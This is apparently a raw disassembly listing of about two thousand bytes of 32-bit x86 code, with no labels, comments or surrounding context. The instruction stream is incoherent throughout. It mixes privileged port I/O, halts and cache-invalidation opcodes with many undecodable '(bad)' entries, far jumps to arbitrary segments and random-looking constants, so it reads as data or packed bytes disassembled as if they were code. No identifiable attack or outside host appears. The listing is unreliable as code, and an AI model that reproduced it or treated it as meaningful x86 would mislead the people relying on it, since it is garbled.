  417dc8:	or     BYTE PTR [ebp+0x32],al
  417dcb:	push   eax
  417dcc:	loopne 0x417d97
  417dce:	adc    dl,BYTE PTR ds:0x435a9ddc
  417dd4:	test   eax,0x8f8cc9de
  417dd9:	ror    BYTE PTR [edx+0x5b9a3a],1
  417ddf:	jle    0x417dd1
  417de1:	mov    eax,ds:0xa80df613
  417de6:	sub    dh,ch
  417de8:	shl    BYTE PTR [edx+0x12],1
  417deb:	aaa    
  417dec:	and    BYTE PTR [edx+0x1b778898],0xcd
  417df3:	ret    0x3f87
  417df6:	ror    BYTE PTR [ebx-0x3446e7f],1
  417dfc:	sbb    cl,BYTE PTR [ebx-0x76ca898e]
  417e02:	push   esi
  417e03:	pop    ebp
  417e04:	daa    
  417e05:	add    esp,DWORD PTR [edx+edx*1]
  417e08:	xor    esp,esi
  417e0a:	dec    edi
  417e0b:	sbb    al,0xe0
  417e0d:	and    al,BYTE PTR [edi+0xc5ab08f]
  417e13:	or     eax,0xb3537aae
  417e18:	inc    ecx
  417e19:	add    DWORD PTR [ebx+0x18ffb72d],edi
  417e1f:	dec    edx
  417e20:	repnz cwde 
  417e22:	and    al,0x13
  417e24:	pop    DWORD PTR [eax]
  417e26:	rcr    BYTE PTR [esi+eax*8+0x71],cl
  417e2a:	pusha  
  417e2b:	imul   esp,DWORD PTR [edx+0xc6633e1],0x483cb820
  417e35:	push   ebp
  417e36:	mov    esp,0x10871e86
  417e3b:	mov    ebx,0x4320057
  417e40:	pop    es
  417e41:	popa   
  417e42:	xor    DWORD PTR [ecx-0x58280aad],0xfc31762c
  417e4c:	jecxz  0x417e3b
  417e4e:	ret    
  417e4f:	adc    cl,dh
  417e51:	sub    dh,dh
  417e53:	dec    ecx
  417e54:	push   es
  417e55:	sbb    bl,BYTE PTR [ebp+0x462efedb]
  417e5b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417e5d:	jg     0x417e39
  417e5f:	sbb    eax,edx
  417e61:	mov    al,0x57
  417e63:	test   al,0x33
  417e65:	add    DWORD PTR [eax*1+0x681361b8],0x931322b0
  417e70:	jmp    0x417eed
  417e72:	les    edx,FWORD PTR [edx]
  417e74:	dec    esp
  417e75:	jo     0x417ed5
  417e77:	jp     0x417e82
  417e79:	adc    al,0xc7
  417e7b:	jge    0x417e94
  417e7d:	mov    ebp,ebp
  417e7f:	inc    ebp
  417e80:	fcomp  QWORD PTR [ecx+0xc47ec53]
  417e86:	or     ebx,ecx
  417e88:	stos   DWORD PTR es:[edi],eax
  417e89:	mov    esi,0x21e1b3c0
  417e8e:	cld    
  417e8f:	out    0x4d,eax
  417e91:	pop    ecx
  417e92:	scas   al,BYTE PTR es:[edi]
  417e93:	adc    eax,DWORD PTR [ebp+0x4e]
  417e96:	push   esi
  417e97:	lods   al,BYTE PTR ds:[esi]
  417e98:	jmp    0x6f22:0xb14a9c57
  417e9f:	dec    edi
  417ea0:	loope  0x417ea0
  417ea2:	add    al,0xa9
  417ea4:	ficomp DWORD PTR [ebx]
  417ea6:	pextrw ecx,mm2,0xf0
  417eaa:	nop
  417eab:	or     al,0x58
  417ead:	fs cli 
  417eaf:	in     eax,0xae
  417eb1:	out    0x2f,al
  417eb3:	mov    ch,0x62
  417eb5:	lock dec ebx
  417eb7:	ja     0x417eed
  417eb9:	popaw  
  417ebb:	mov    cl,0x49
  417ebd:	daa    
  417ebe:	push   ds
  417ebf:	adc    BYTE PTR [esi+ecx*2+0x39],dh
  417ec3:	ins    BYTE PTR es:[edi],dx
  417ec4:	xor    DWORD PTR [esi-0x19],0x30
  417ec8:	(bad)  
  417ec9:	add    edi,DWORD PTR ds:0x75c2a62f
  417ecf:	cmp    bh,BYTE PTR [eax+ebp*1+0x760dac72]
  417ed6:	xor    edi,edi
  417ed8:	lock inc ebx
  417eda:	ins    DWORD PTR es:[edi],dx
  417edb:	rcr    DWORD PTR [edi+0x1cd2e61e],0x50
  417ee2:	pop    es
  417ee3:	push   0x5b332712
  417ee8:	lea    edi,[ebx+0x2ea00d53]
  417eee:	sub    al,0x35
  417ef0:	add    al,0x86
  417ef2:	es ret 0x1f07
  417ef6:	inc    ebp
  417ef7:	adc    BYTE PTR [edx],cl
  417ef9:	iret   
  417efa:	mov    esi,0x11954d4d
  417eff:	lock adc esi,DWORD PTR ds:0x197ca703
  417f06:	stc    
  417f07:	retf   0x46d8
  417f0a:	xor    al,0x86
  417f0c:	ficomp DWORD PTR [ebx-0xb23b6e6]
  417f12:	iret   
  417f13:	std    
  417f14:	dec    edx
  417f15:	pop    edx
  417f16:	push   0x7aac5079
  417f1b:	dec    DWORD PTR [ecx]
  417f1d:	aaa    
  417f1e:	xchg   BYTE PTR [ebx+edi*8+0x52fa6395],ah
  417f25:	xchg   ecx,esi
  417f27:	loop   0x417f3e
  417f29:	add    cl,BYTE PTR [ecx]
  417f2b:	pop    ebx
  417f2c:	xchg   BYTE PTR [ebx+0x530a9d7a],al
  417f32:	hlt    
  417f33:	jo     0x417f0a
  417f35:	(bad)  
  417f36:	rcl    DWORD PTR [edx-0x9f45440],1
  417f3c:	dec    esp
  417f3d:	ret    0x778f
  417f40:	hlt    
  417f41:	das    
  417f42:	xchg   edx,eax
  417f43:	icebp  
  417f44:	and    DWORD PTR [esi],eax
  417f46:	call   0x18905806
  417f4b:	leave  
  417f4c:	and    cl,dl
  417f4e:	pop    ebp
  417f4f:	cmp    al,0xaf
  417f51:	jbe    0x417f68
  417f53:	mov    esp,0x2b173066
  417f58:	arpl   ax,cx
  417f5a:	je     0x417f31
  417f5c:	lods   al,BYTE PTR ds:[esi]
  417f5d:	pop    edi
  417f5e:	or     eax,0x55a5dada
  417f63:	or     BYTE PTR [edi+eax*2+0x39fa27c],al
  417f6a:	test   al,0xad
  417f6c:	out    dx,eax
  417f6d:	cmc    
  417f6e:	fidivr WORD PTR [ebp-0x10]
  417f71:	inc    edx
  417f72:	add    dl,BYTE PTR [edx]
  417f74:	out    0x17,eax
  417f76:	add    eax,0x5ce290af
  417f7b:	cdq    
  417f7c:	in     eax,dx
  417f7d:	add    dh,BYTE PTR [ebx+0x6acf3457]
  417f83:	adc    BYTE PTR [edi],0xfb
  417f86:	shl    cl,1
  417f88:	ror    BYTE PTR [ebp-0x19],0x66
  417f8c:	imul   ebp,edx,0x93d45ddc
  417f92:	sbb    esi,esi
  417f94:	push   ss
  417f95:	ins    BYTE PTR es:[edi],dx
  417f96:	sbb    DWORD PTR [esi],0xffffffa9
  417f99:	fwait
  417f9a:	ret    
  417f9b:	mov    DWORD PTR [ecx],0x3af66342
  417fa1:	pop    esi
  417fa2:	jmp    0xce29:0xff92515
  417fa9:	(bad)  
  417faa:	xor    DWORD PTR [ebx-0x69],edx
  417fad:	dec    eax
  417fae:	pop    ecx
  417faf:	hlt    
  417fb0:	xor    BYTE PTR [ebx+0x1bae91dc],al
  417fb6:	mov    ebx,0x51e04d4b
  417fbb:	retf   0xd1f7
  417fbe:	push   edi
  417fbf:	jb     0x417fd4
  417fc1:	shl    al,cl
  417fc3:	sbb    DWORD PTR [ebx-0x18],0x70
  417fc7:	pop    ds
  417fc8:	(bad)  
  417fc9:	xchg   edx,eax
  417fca:	sbb    al,0xbc
  417fcc:	push   edi
  417fcd:	mov    es,WORD PTR [ecx]
  417fcf:	add    eax,0x7e2d8a8c
  417fd4:	xchg   DWORD PTR [ecx-0x46],esp
  417fd7:	out    0xfb,al
  417fd9:	and    DWORD PTR [eax],ecx
  417fdb:	xor    al,0xe5
  417fdd:	les    edi,FWORD PTR [edi+0x613056fa]
  417fe3:	mov    ds:0x15c72a79,al
  417fe8:	cmp    bh,BYTE PTR [ecx]
  417fea:	dec    edx
  417feb:	lods   eax,DWORD PTR ds:[esi]
  417fec:	add    eax,DWORD PTR [ecx]
  417fee:	jg     0x41800b
  417ff0:	adc    al,0x5e
  417ff2:	fwait
  417ff3:	cwde   
  417ff4:	mov    al,ds:0xe2002982
  417ff9:	inc    eax
  417ffa:	test   ah,al
  417ffc:	mov    ah,0x6f
  417ffe:	sub    DWORD PTR [ecx+0x5d],0xae7efe4
  418005:	mov    dh,0xbc
  418007:	repz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  41800a:	dec    esp
  41800b:	jmp    0xee04790e
  418010:	cmc    
  418011:	pop    ebp
  418012:	test   ch,bh
  418014:	ror    dl,1
  418016:	pop    es
  418017:	cwde   
  418018:	pop    eax
  418019:	int3   
  41801a:	sbb    edi,esp
  41801c:	jae    0x418080
  41801e:	cmp    bh,BYTE PTR [ecx+0x4dceba89]
  418024:	fsubr  QWORD PTR [ebx-0x91e445e]
  41802a:	test   esi,eax
  41802c:	das    
  41802d:	rcr    DWORD PTR ss:[ebp+edi*1-0x76],cl
  418032:	dec    esp
  418033:	mov    esp,0xdf0bb907
  418038:	js     0x417fbc
  41803a:	jp     0x417fd5
  41803c:	or     eax,0x1c0bf940
  418041:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418043:	xchg   DWORD PTR [esi+ebp*1+0x63],eax
  418047:	in     al,dx
  418048:	out    dx,eax
  418049:	mov    esi,0xcd5344cc
  41804e:	mov    cl,0x8
  418050:	sbb    dh,al
  418052:	mov    cs,WORD PTR [ebx-0x1b]
  418055:	shl    ah,1
  418057:	and    dh,BYTE PTR [esi-0x33]
  41805a:	fmul   QWORD PTR [esi+0x3f77b92a]
  418060:	and    eax,0xa5506c1e
  418065:	pop    ecx
  418066:	push   ecx
  418067:	push   edx
  418068:	mov    ebp,0xdb8a31fc
  41806d:	fadd   QWORD PTR [eax]
  41806f:	and    esi,0xffffff9f
  418072:	fsubr  st(6),st
  418074:	std    
  418075:	push   cs
  418076:	adc    al,0x82
  418078:	loop   0x4180c3
  41807a:	popa   
  41807b:	adc    bl,dh
  41807d:	test   BYTE PTR [edi+0x66],al
  418080:	shl    DWORD PTR [eax],cl
  418082:	pop    ss
  418083:	js     0x41800a
  418085:	popa   
  418086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418087:	inc    eax
  418088:	jmp    0x418016
  41808a:	mov    bh,0xf2
  41808c:	rol    DWORD PTR [ebp-0x6862d645],0x29
  418093:	mov    ch,0x10
  418095:	ret    0x55fb
  418098:	mov    ds:0xc3cade3b,eax
  41809d:	(bad)  gs:[eax]
  4180a0:	cmp    ebp,eax
  4180a2:	shl    DWORD PTR [edx+0x651b8981],1
  4180a8:	rcr    BYTE PTR [edx-0x48314052],1
  4180ae:	mov    edi,ds
  4180b0:	add    al,0xd3
  4180b2:	into   
  4180b3:	cmp    eax,0xa95587d4
  4180b8:	out    0xea,eax
  4180ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180bb:	mov    bl,0x9d
  4180bd:	jl     0x418102
  4180bf:	sbb    BYTE PTR [ebx],ah
  4180c1:	pop    ecx
  4180c2:	xor    esi,DWORD PTR [ebx+0x50]
  4180c5:	mul    DWORD PTR [edx-0x38fa3369]
  4180cb:	dec    ecx
  4180cc:	fstp   QWORD PTR [ecx-0x3744c804]
  4180d2:	dec    esp
  4180d3:	push   ebx
  4180d4:	std    
  4180d5:	mov    edx,gs
  4180d7:	pop    ecx
  4180d8:	hlt    
  4180d9:	sub    al,0x60
  4180db:	mov    ecx,0x7c02dd38
  4180e0:	call   0x61955624
  4180e5:	sbb    BYTE PTR [ebx-0x54],0x32
  4180e9:	and    al,0xe7
  4180eb:	js     0x418073
  4180ed:	mov    al,ds:0xad1ef25b
  4180f2:	nop    ecx
  4180f5:	xor    eax,0x9729d1da
  4180fa:	jl     0x4180b0
  4180fc:	scas   eax,DWORD PTR es:[edi]
  4180fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180fe:	push   esi
  4180ff:	js     0x418108
  418101:	loopne 0x4180f8
  418103:	les    esp,FWORD PTR [ebx+0x49f1e0b7]
  418109:	cdq    
  41810a:	(bad)  
  41810b:	pop    es
  41810c:	fidiv  WORD PTR [edi+eiz*1]
  41810f:	popa   
  418110:	mov    esp,0x4ddfc468
  418115:	sar    BYTE PTR [ecx],1
  418117:	ja     0x4180b5
  418119:	push   0x74c429c7
  41811e:	dec    edi
  41811f:	pushf  
  418120:	and    eax,0xffe13597
  418125:	rcl    DWORD PTR ds:0x12f313e2,0x6d
  41812c:	aam    0xae
  41812e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41812f:	sub    al,0x28
  418131:	mov    eax,0xeaf04e1e
  418136:	ins    DWORD PTR es:[edi],dx
  418137:	or     al,0x5d
  418139:	jecxz  0x41818c
  41813b:	scas   al,BYTE PTR es:[edi]
  41813c:	and    BYTE PTR [edi],bl
  41813e:	jge    0x41817e
  418140:	outs   dx,BYTE PTR ds:[esi]
  418141:	add    dl,cl
  418143:	xlat   BYTE PTR ds:[ebx]
  418144:	in     al,0x22
  418146:	(bad)  
  418147:	sbb    eax,0x6d20052b
  41814c:	xor    edx,DWORD PTR [edi+0x42]
  41814f:	stos   BYTE PTR es:[edi],al
  418150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418151:	sbb    al,0x72
  418153:	ror    DWORD PTR [edi-0x40321545],1
  418159:	mov    ecx,0xf0b2e695
  41815e:	jae    0x418118
  418160:	push   eax
  418161:	shl    BYTE PTR [esi+0x73],0x50
  418165:	data16 out 0xe0,al
  418168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418169:	sti    
  41816a:	hlt    
  41816b:	pop    ss
  41816c:	mov    ecx,0x66ed6352
  418171:	and    al,0xea
  418173:	sbb    dh,ah
  418175:	jg     0x418135
  418177:	push   ds
  418178:	jo     0x418184
  41817a:	call   0x862b:0x91e475de
  418181:	in     al,0xf4
  418183:	jg     0x418145
  418185:	xor    dh,al
  418187:	and    ah,bh
  418189:	mov    cl,0x26
  41818b:	xchg   ecx,eax
  41818c:	xor    ch,bl
  41818e:	ins    DWORD PTR es:[edi],dx
  41818f:	lea    esp,[eax+0x2cbc2366]
  418195:	xor    ebp,esi
  418197:	repz or BYTE PTR [esi-0x17cabf34],al
  41819e:	aaa    
  41819f:	sti    
  4181a0:	mov    esp,0x63fb5d1f
  4181a5:	sub    al,0xd4
  4181a7:	or     eax,0xf908defc
  4181ac:	(bad)  
  4181ad:	pop    ebx
  4181ae:	cmc    
  4181af:	inc    edi
  4181b0:	or     al,0x9c
  4181b2:	cmp    dh,0x77
  4181b5:	xor    edx,DWORD PTR [edi-0x48]
  4181b8:	xor    BYTE PTR [ecx-0x54],dl
  4181bb:	fdivr  DWORD PTR [esi]
  4181bd:	rcr    BYTE PTR [ebx+0x78],0xed
  4181c1:	inc    ebp
  4181c2:	lahf   
  4181c3:	or     ebp,0xffffff9d
  4181c6:	mov    eax,0xf305123
  4181cb:	ss pusha 
  4181cd:	mov    eax,0x18c0f6ff
  4181d2:	mov    ah,ch
  4181d4:	pushf  
  4181d5:	(bad)  
  4181d6:	and    al,0x93
  4181d8:	and    eax,0x72477ec5
  4181dd:	push   eax
  4181de:	push   ds
  4181df:	and    al,0x1d
  4181e1:	dec    edi
  4181e2:	jno    0x4181b3
  4181e4:	jp     0x418262
  4181e6:	mov    eax,0x92709bcc
  4181eb:	sub    BYTE PTR [eax-0x23],ch
  4181ee:	(bad)  
  4181ef:	push   ebp
  4181f0:	jae    0x418262
  4181f2:	dec    ebp
  4181f3:	mov    al,ds:0x98d51883
  4181f8:	ficom  WORD PTR [ebp-0xc6219cc]
  4181fe:	mov    ch,0xaf
  418200:	je     0x41821e
  418202:	ret    0xea89
  418205:	jp     0x4181f6
  418207:	or     al,0xe4
  418209:	sub    eax,0x184bb90b
  41820e:	sbb    BYTE PTR ds:0x2e90383c,ah
  418214:	gs cs mov ch,0xd4
  418218:	inc    edi
  418219:	pop    edx
  41821a:	fisubr WORD PTR [edi-0x50867813]
  418220:	fidiv  WORD PTR [ebp+edi*2-0x3044f776]
  418227:	(bad)  [ebx*4+0x2d71edcc]
  41822e:	iret   
  41822f:	scas   eax,DWORD PTR es:[edi]
  418230:	data16 fs stos BYTE PTR es:[edi],al
  418233:	xor    eax,ebx
  418235:	dec    ecx
  418236:	leave  
  418237:	pop    ecx
  418238:	sbb    dl,BYTE PTR [edi+0x24e91ae]
  41823e:	lds    esp,FWORD PTR [ebx+0x22f6dac8]
  418244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418245:	repz sti 
  418247:	mov    ch,0x8e
  418249:	mov    bl,0x46
  41824b:	shl    DWORD PTR [esi-0x1419c814],0x6e
  418252:	sub    bl,0xce
  418255:	sub    dl,BYTE PTR [ecx+0x7e30df63]
  41825b:	aam    0xf1
  41825d:	test   eax,0x6b8cb7e4
  418262:	pop    ebx
  418263:	sub    BYTE PTR [eax-0x1e4d5f04],bl
  418269:	adc    bh,BYTE PTR [edx]
  41826b:	sbb    al,0x5a
  41826d:	jns    0x4182ec
  41826f:	iret   
  418270:	mov    ebx,0x4ea40bb9
  418275:	in     eax,dx
  418276:	mov    WORD PTR ds:0x18e37b6b,es
  41827c:	adc    dl,0x6c
  41827f:	lock fnstcw WORD PTR [esi]
  418282:	mov    BYTE PTR [edi],cl
  418284:	sub    eax,0xb422a8e5
  418289:	mov    cl,0x65
  41828b:	outs   dx,BYTE PTR ds:[esi]
  41828c:	aad    0x1c
  41828e:	mov    cl,0x9b
  418290:	inc    ebp
  418291:	cmp    al,0x5f
  418293:	scas   eax,DWORD PTR es:[edi]
  418294:	repnz or eax,0x92169984
  41829a:	scas   eax,DWORD PTR es:[edi]
  41829b:	les    ebp,FWORD PTR [edi+0x3e26ed79]
  4182a1:	add    DWORD PTR [ebp+0x33817220],eax
  4182a7:	mov    BYTE PTR [ebp-0x3ebd3ba9],bh
  4182ad:	mov    al,0x61
  4182af:	cmp    eax,0x321778a9
  4182b4:	push   ebx
  4182b5:	push   ebp
  4182b6:	retf   
  4182b7:	or     eax,esp
  4182b9:	jecxz  0x4182ce
  4182bb:	aas    
  4182bc:	push   ecx
  4182bd:	dec    ebp
  4182be:	fldcw  WORD PTR [edx-0x71]
  4182c1:	push   0xa5cd31a0
  4182c6:	das    
  4182c7:	out    dx,al
  4182c8:	test   BYTE PTR [ecx+0x55],bh
  4182cb:	les    ecx,FWORD PTR [esi+0x15]
  4182ce:	pop    ds
  4182cf:	in     eax,0x1c
  4182d1:	cmp    BYTE PTR [esi+esi*8-0x7548d7e9],0xcf
  4182d9:	mov    ebp,0x542ccd7b
  4182de:	inc    esp
  4182df:	and    BYTE PTR [ecx+0x44892511],ah
  4182e5:	invd   
  4182e7:	loopne 0x418285
  4182e9:	test   DWORD PTR [ecx+eiz*2+0x1f7ff4b0],ecx
  4182f0:	mov    ecx,0xb3621fb1
  4182f5:	icebp  
  4182f6:	sub    BYTE PTR [edx+0x45],dl
  4182f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182fa:	shr    BYTE PTR [eax+0x65],1
  4182fd:	aas    
  4182fe:	cmp    edi,DWORD PTR [edi+0x640f064a]
  418304:	mov    ds:0x3229b26a,al
  418309:	(bad)  
  41830a:	outs   dx,DWORD PTR ds:[esi]
  41830b:	rol    BYTE PTR [edx-0x18],cl
  41830e:	mov    ecx,0x38a86b24
  418313:	inc    esi
  418314:	xchg   ebp,eax
  418315:	mov    bh,0x3e
  418317:	cld    
  418318:	cmp    edx,edx
  41831a:	stos   DWORD PTR es:[edi],eax
  41831b:	hlt    
  41831c:	xchg   esi,eax
  41831d:	sti    
  41831e:	in     eax,0x91
  418320:	ds jle 0x418369
  418323:	xor    DWORD PTR [edx+0x63262fae],0xc2226fbb
  41832d:	das    
  41832e:	stc    
  41832f:	(bad)  
  418330:	leave  
  418331:	inc    ebx
  418332:	push   ebx
  418333:	out    0x60,al
  418335:	or     esp,DWORD PTR [eax+0x1ce93ae5]
  41833b:	je     0x418333
  41833d:	or     eax,0x12c4881a
  418342:	mov    esi,0x60d36a50
  418347:	or     al,bh
  418349:	test   BYTE PTR [esi+eax*8+0x50],dl
  41834d:	outs   dx,BYTE PTR ds:[esi]
  41834e:	xchg   esi,eax
  41834f:	jbe    0x4182d5
  418351:	loope  0x4183be
  418353:	sub    ebx,DWORD PTR [esi+0x1]
  418356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418357:	jb     0x4182ee
  418359:	jg     0x41837e
  41835b:	bound  eax,QWORD PTR [ebp-0x4a]
  41835e:	xor    edi,DWORD PTR [esi+ebp*2-0x752f86e1]
  418365:	pop    edi
  418366:	adc    al,0x8c
  418368:	mov    dl,0xb8
  41836a:	jmp    0x387daedf
  41836f:	or     bl,BYTE PTR [ecx-0x50283b6a]
  418375:	and    al,0x3e
  418377:	dec    esp
  418378:	inc    eax
  418379:	jo     0x418321
  41837b:	and    ch,BYTE PTR [ebx+0xacab976]
  418381:	into   
  418382:	int    0x97
  418384:	daa    
  418385:	paddsb mm7,QWORD PTR [edi+0x37]
  418389:	leave  
  41838a:	call   0x900ee175
  41838f:	scas   eax,DWORD PTR es:[edi]
  418390:	push   ecx
  418391:	xor    BYTE PTR [edx+0x6a],ch
  418394:	arpl   WORD PTR [edi+0x7d025100],ax
  41839a:	cmp    DWORD PTR [eax],ecx
  41839c:	inc    esp
  41839d:	scas   eax,DWORD PTR es:[edi]
  41839e:	cmp    ecx,ebx
  4183a0:	repz into 
  4183a2:	lock out 0xb7,eax
  4183a5:	xchg   ebp,eax
  4183a6:	std    
  4183a7:	jl     0x41840b
  4183a9:	jb     0x4183e0
  4183ab:	sbb    cl,al
  4183ad:	ss push ecx
  4183af:	out    0x50,eax
  4183b1:	xchg   BYTE PTR [ecx-0x17cc0e44],bh
  4183b7:	jl     0x418349
  4183b9:	cmp    ebp,DWORD PTR [esi+0x382bd20]
  4183bf:	jbe    0x4183c3
  4183c1:	inc    edi
  4183c2:	(bad)  
  4183c3:	(bad)  
  4183c4:	ficomp DWORD PTR [ebp-0x23]
  4183c7:	in     al,dx
  4183c8:	cmp    ebp,eax
  4183ca:	repnz cmp al,0xf
  4183cd:	push   edx
  4183ce:	or     DWORD PTR [edx-0x59],eax
  4183d1:	xor    BYTE PTR [di-0x3019],bl
  4183d6:	jae    0x418426
  4183d8:	test   DWORD PTR [ebx],0x5965f6f3
  4183de:	pushf  
  4183df:	bound  ebx,QWORD PTR [ecx+0x74]
  4183e2:	xchg   ebx,eax
  4183e3:	ja     0x41844a
  4183e5:	outs   dx,DWORD PTR ds:[esi]
  4183e6:	or     ecx,DWORD PTR [ebx]
  4183e8:	sbb    dl,ch
  4183ea:	or     eax,0x59449e55
  4183ef:	mov    DWORD PTR [edi+edx*1],esi
  4183f2:	and    eax,0x324ebd65
  4183f7:	shl    al,1
  4183f9:	stc    
  4183fa:	rcr    DWORD PTR [edx],1
  4183fc:	out    dx,eax
  4183fd:	iret   
  4183fe:	cmp    eax,0x15abcb20
  418403:	push   esp
  418404:	(bad)  
  418405:	jmp    0x418407
  418407:	mov    ebx,es
  418409:	mov    edi,0x3edad5e6
  41840e:	pop    esp
  41840f:	outs   dx,BYTE PTR ds:[esi]
  418410:	lea    edx,[ebp+0xb]
  418413:	test   BYTE PTR [eax+eax*8-0xdbf00f2],0x12
  41841b:	je     0x4183a5
  41841d:	(bad)  
  41841e:	mov    ds:0x2c1e0c83,al
  418423:	pusha  
  418424:	xchg   edx,eax
  418425:	mov    esi,0xd2f07ed2
  41842a:	xor    al,cl
  41842c:	push   ds
  41842d:	repnz fs xchg edx,eax
  418430:	dec    ebx
  418431:	mov    al,ds:0xae3d89ab
  418436:	or     eax,0x823b80fa
  41843b:	pop    eax
  41843c:	lds    esi,FWORD PTR [edx]
  41843e:	sbb    DWORD PTR [esi],eax
  418440:	stos   DWORD PTR es:[edi],eax
  418441:	pop    eax
  418442:	pushf  
  418443:	or     bl,al
  418445:	ret    
  418446:	jns    0x418469
  418448:	or     bh,BYTE PTR [ecx-0xb]
  41844b:	mov    ebx,0x6fe59bea
  418450:	repnz push 0x34
  418453:	xor    dh,BYTE PTR [eax+0x49]
  418456:	in     eax,0x61
  418458:	mov    gs,edx
  41845a:	out    0x4a,eax
  41845c:	sub    eax,0xa9404e06
  418461:	jae    0x41846d
  418463:	adc    al,0x89
  418465:	out    0xc0,eax
  418467:	add    al,0x54
  418469:	aaa    
  41846a:	retf   0x79cb
  41846d:	sbb    al,0x8d
  41846f:	add    bh,BYTE PTR [edi-0x28]
  418472:	addr16 pop ecx
  418474:	and    al,al
  418476:	call   0xca72505a
  41847b:	inc    ecx
  41847c:	mov    dl,0x9f
  41847e:	enter  0x1962,0xf1
  418482:	sbb    eax,0xef8230df
  418487:	leave  
  418488:	lahf   
  418489:	int    0x4
  41848b:	push   esp
  41848c:	push   ds
  41848d:	adc    al,0x49
  41848f:	push   cs
  418490:	nop    DWORD PTR [ebp+0x15]
  418494:	and    BYTE PTR [ebp+0x36dc6ee7],dl
  41849a:	retf   
  41849b:	sbb    al,0x41
  41849d:	push   0x63
  41849f:	std    
  4184a0:	cld    
  4184a1:	mov    edi,0xff48a2b8
  4184a6:	sub    al,0xb5
  4184a8:	scas   al,BYTE PTR es:[edi]
  4184a9:	pusha  
  4184aa:	dec    edx
  4184ab:	das    
  4184ac:	jmp    DWORD PTR [edx]
  4184ae:	nop
  4184af:	test   BYTE PTR [edi+0x12],bl
  4184b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b3:	adc    BYTE PTR [eax+0x30],bl
  4184b6:	cmp    DWORD PTR [ebp+0xc],ebp
  4184b9:	das    
  4184ba:	xchg   edx,eax
  4184bb:	pop    ecx
  4184bc:	lea    edx,[esi-0x50]
  4184bf:	or     BYTE PTR [ebx-0x6f],bh
  4184c2:	lahf   
  4184c3:	pop    eax
  4184c4:	mov    ch,0x85
  4184c6:	int3   
  4184c7:	inc    ebx
  4184c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c9:	sbb    ebx,esp
  4184cb:	add    al,0x5f
  4184cd:	dec    esp
  4184ce:	pop    eax
  4184cf:	es gs push esp
  4184d2:	retf   
  4184d3:	pop    ds
  4184d4:	sub    bh,BYTE PTR [ecx+0x71ba2a4a]
  4184da:	lock stos BYTE PTR es:[edi],al
  4184dc:	sbb    ch,BYTE PTR [edx]
  4184de:	or     DWORD PTR [ecx-0x23],edi
  4184e1:	push   ebx
  4184e2:	enter  0x3059,0x2f
  4184e6:	xlat   BYTE PTR ds:[ebx]
  4184e7:	sub    al,0xab
  4184e9:	sahf   
  4184ea:	mov    ds:0x54290d2c,eax
  4184ef:	or     DWORD PTR [edi+0x70cdd6fd],ebp
  4184f5:	xor    al,0xd8
  4184f7:	mov    ebp,0x38ce1913
  4184fc:	sub    DWORD PTR [ecx-0x7f],edi
  4184ff:	outs   dx,DWORD PTR ds:[esi]
  418500:	fwait
  418501:	test   al,0x86
  418503:	xchg   esi,eax
  418504:	popf   
  418505:	adc    BYTE PTR [esi-0x15],0x87
  418509:	sub    DWORD PTR [esp+ecx*4],esp
  41850c:	xor    DWORD PTR [ebp+ecx*8+0x13],edx
  418510:	jmp    0x4c9633ee
  418515:	out    dx,eax
  418516:	lock mov bh,0x76
  418519:	jmp    0x4184a5
  41851b:	scas   eax,DWORD PTR es:[edi]
  41851c:	jo     0x418569
  41851e:	jb     0x41851a
  418520:	push   edi
  418521:	pop    edi
  418522:	fisttp DWORD PTR [edx]
  418524:	lahf   
  418525:	call   0x7fb9f150
  41852a:	dec    esp
  41852b:	add    BYTE PTR ds:0x2becebec,ah
  418531:	sahf   
  418532:	sbb    al,0xcf
  418534:	iret   
  418535:	xchg   ebp,eax
  418536:	jnp    0x418508
  418538:	adc    DWORD PTR [eax+0x2e],ebx
  41853b:	adc    al,0xd0
  41853d:	adc    al,0xe8
  41853f:	adc    ah,BYTE PTR [ecx+0x39]
  418542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418543:	push   cs
  418544:	mov    edx,?
  418546:	adc    edx,DWORD PTR [esi+0x7f]
  418549:	cmp    edi,0x62
  41854c:	mov    edi,0x9c9dad1a
  418551:	add    dh,bh
  418553:	les    esi,FWORD PTR [ecx-0x6d]
  418556:	loop   0x4185c5
  418558:	fnstenv [ecx+0xf]
  41855b:	xor    eax,DWORD PTR [ebx-0x61]
  41855e:	sub    dl,BYTE PTR [esp+edi*8-0x29511fe3]
  418565:	dec    esi
  418566:	jmp    0x41858d
  418568:	mov    dl,0x5
  41856a:	add    eax,0xf559ade6
  41856f:	test   DWORD PTR [ecx-0xb148728],edi
  418575:	cdq    
  418576:	xchg   esp,eax
  418577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418578:	push   es
  418579:	clc    
  41857a:	dec    ecx
  41857b:	(bad)  
  41857c:	push   edx
  41857d:	pop    esp
  41857e:	sub    al,0xca
  418580:	lods   al,BYTE PTR ds:[esi]
  418581:	push   es
  418582:	xor    DWORD PTR [ecx],0x499de53d
  418588:	xor    ah,BYTE PTR [edi-0x344729c]
  41858e:	or     bh,BYTE PTR [esp+ebp*1+0x7be01691]
  418595:	mov    bh,0x9f
  418597:	jae    0x41860c
  418599:	mov    dh,0x9a
  41859b:	xchg   BYTE PTR [ebx+0x5a3a2eb6],dl
  4185a1:	sar    DWORD PTR [esp+edx*2+0x2c],cl
  4185a5:	mov    ah,0xcd
  4185a7:	shl    bh,1
  4185a9:	xchg   DWORD PTR [ecx+0x55],ecx
  4185ac:	test   BYTE PTR cs:[edi+0x3852ca17],al
  4185b3:	pop    esp
  4185b4:	rcl    BYTE PTR [edi-0x7cae7a72],0x39
  4185bb:	xor    DWORD PTR ds:0x6d551d17,ebp
  4185c1:	ins    DWORD PTR es:[edi],dx
  4185c2:	jmp    0xaa3d:0x9b7d9ee8
